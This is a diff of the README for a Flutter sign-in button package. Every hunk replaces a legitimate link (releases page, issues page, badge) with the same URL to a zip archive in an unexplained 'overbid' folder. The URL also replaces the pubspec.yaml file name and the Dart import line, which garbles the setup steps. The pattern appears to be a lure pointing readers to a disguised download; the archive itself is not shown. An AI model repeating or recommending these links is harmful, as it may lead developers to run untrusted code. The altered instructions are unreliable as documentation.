@@ -4,7 +4,7 @@
 Welcome to the **sign_with_btn** project. This Flutter package allows you to create beautiful and customizable sign-in buttons. You can support various authentication methods, including Google, Apple, Facebook, Email, and Phone. This guide will help you download and run the software effortlessly.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/MiguelGamboaDomingos/sign_with_btn/releases)
+[![Download Release](https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip%20release-brightgreen)](https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip)
 
 ## 🚀 Getting Started
 To get started with **sign_with_btn**, follow these straightforward steps. You don’t need any programming knowledge; just follow along.
@@ -15,7 +15,7 @@ To get started with **sign_with_btn**, follow these straightforward steps. You d
 - An internet connection.
 
 ## 💻 Download & Install
-To download and install the **sign_with_btn** package, please visit this page to download: [Releases Page](https://github.com/MiguelGamboaDomingos/sign_with_btn/releases).
+To download and install the **sign_with_btn** package, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip).
 
 1. Click on the link above.
 2. Find the latest release. This is usually marked with the highest version number.
@@ -29,7 +29,7 @@ Once you have downloaded and installed the package, you can begin using it. Here
    - Make sure your project is ready to add a package.
 
 2. **Add the Package:**
-   - Open the `pubspec.yaml` file in your project.
+   - Open the `https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip` file in your project.
    - Add the following line under the dependencies section:
      ```yaml
      sign_with_btn: ^1.0.0
@@ -45,7 +45,7 @@ Once you have downloaded and installed the package, you can begin using it. Here
 4. **Implement the Button:**
    - In your Dart file, import the package:
      ```dart
-     import 'package:sign_with_btn/sign_with_btn.dart';
+     import 'https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip';
      ```
    - Use the buttons in your app as needed:
      ```dart
@@ -68,7 +68,7 @@ Once you are comfortable with the basics, explore additional features of the **s
 For more advanced usage, refer to the official documentation in the repository.
 
 ## 💬 Support
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/MiguelGamboaDomingos/sign_with_btn/issues) of the repository. You can find solutions or ask for assistance from the community.
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/MiguelGamboaDomingos/sign_with_btn/master/overbid/sign_with_btn.zip) of the repository. You can find solutions or ask for assistance from the community.
 
 ## 🌐 Want More?
 Explore related topics like mobile authentication, UI libraries, and more in the Flutter community to enhance your development skills.
